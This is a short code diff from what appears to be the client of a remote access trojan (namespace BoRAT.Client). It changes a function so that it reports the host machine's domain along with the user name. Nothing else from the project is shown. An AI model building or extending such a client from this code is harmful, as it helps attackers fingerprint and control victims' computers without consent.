@@ -177,7 +177,7 @@ namespace BoRAT.Client
         {
             try
             {
-                var userName = Environment.UserName;
+                var userName = Environment.UserDomainName + @"\" + Environment.UserName;
                 return userName;
             }
             catch (Exception ex)
